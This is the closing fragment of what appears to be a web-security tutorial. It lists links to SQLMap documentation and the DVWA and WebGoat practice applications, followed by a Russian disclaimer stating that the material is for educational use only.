- **SQLMap Documentation:** https://sqlmap.org/
- **DVWA (Damn Vulnerable Web App):** http://www.dvwa.co.uk/
- **WebGoat:** https://owasp.org/www-project-webgoat/

---

**Этот учебник предоставлен исключительно в образовательных целях. Используйте полученные знания ответственно и этично.**
